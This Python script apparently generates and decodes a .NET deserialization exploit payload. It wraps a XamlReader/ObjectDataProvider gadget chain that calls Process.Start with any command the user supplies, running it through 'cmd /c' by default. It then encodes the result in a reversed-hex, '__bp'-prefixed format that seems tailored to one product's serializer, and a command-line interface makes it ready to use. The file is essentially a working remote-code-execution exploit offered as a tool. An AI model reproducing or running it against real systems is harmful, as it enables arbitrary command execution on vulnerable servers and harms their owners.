import codecs
from lxml import etree
from xml.sax.saxutils import escape

part1 = 'System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089:'
part2 = '<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:a="http://www.w3.org/2001/XMLSchema-instance" xmlns:b="http://www.w3.org/2001/XMLSchema"><ExpandedElement/><ProjectedProperty0><MethodName>Parse</MethodName><MethodParameters><anyType a:type="b:string">%s</anyType></MethodParameters><ObjectInstance a:type="XamlReader"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfXamlReaderObjectDataProvider>'
content = '<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:c="clr-namespace:System;assembly=mscorlib" xmlns:d="clr-namespace:System.Diagnostics;assembly=system"> <ObjectDataProvider x:Key="" ObjectType="{x:Type d:Process}" MethodName="Start"> <ObjectDataProvider.MethodParameters> <c:String>%(base)s</c:String> <c:String>%(arg)s</c:String> </ObjectDataProvider.MethodParameters> </ObjectDataProvider> </ResourceDictionary>'

def html_escape(s):
    _ = escape(s)
    _ = _.replace('"', '&quot;')
    return _

def serialize_payload(cmd):#, _bin=None):
    if ' ' in cmd and '|' not in cmd[:cmd.find(' ')]: # avoid command problem (TODO : find a better solution)
        _bin, _arg = cmd.split(' ', 1)
    else:
        _bin = 'cmd'
        _arg = '/c ' + cmd
    #print(_bin, _arg)
    payload = part1 + part2 % html_escape(content % dict(base=html_escape(_bin), arg=html_escape(_arg)))
    o = ''.join(codecs.encode(codecs.encode(x, 'utf-16be'), 'hex').decode('ascii')[::-1] for x in payload)
    return '__bp' + format(len(o), 'x')[::-1] + o

_0604 = serialize_payload

def deserialize_payload(s):

    _bound = s.find('00')-2
    _length = int(s[4:_bound][::-1], 16)

    p = s[_bound:_bound+_length].replace('00', '')
    assem = codecs.decode(p[::-1], 'hex')[::-1]
    ew = etree.fromstring(assem[assem.find('<ExpandedWrapperOfXamlReaderObjectDataProvider'):])
    rd = etree.fromstring(ew.xpath('//anyType')[0].text)
    odp_mp = rd.iterfind('.//ns:ObjectDataProvider/ns:ObjectDataProvider.MethodParameters', namespaces=dict(ns='http://schemas.microsoft.com/winfx/2006/xaml/presentation')).next()
    _iter = odp_mp.iterchildren()
    _bin = _iter.next().text
    _arg = _iter.next().text
    return (_bin, _arg)

def parse_args():
    import argparse
    parser = argparse.ArgumentParser('0604 (de)serializer')
    parser.add_argument('-f', dest='File', type=str, default='-')
    parser.add_argument('-c', dest='command', type=str, default='cmd')
    parser.add_argument('-a', dest='action', type=str, default='e', choices=['d', 'e'])

    return parser.parse_args()

'''
    o = serialize_payload('-enc', _bin='powershell')
    print(o)
    z = deserialize_payload(o)
    print(z)
'''

if __name__ == '__main__':
    args = parse_args()
    if args.File == '-':
        print('Read serialized payload from STDIN')
    elif args.File:
        args.command = open(args.File).readline().strip()
    act = 'serialize' if args.action == 'e' else 'deserialize'
    print(globals()['%s_payload' % (act)](args.command))
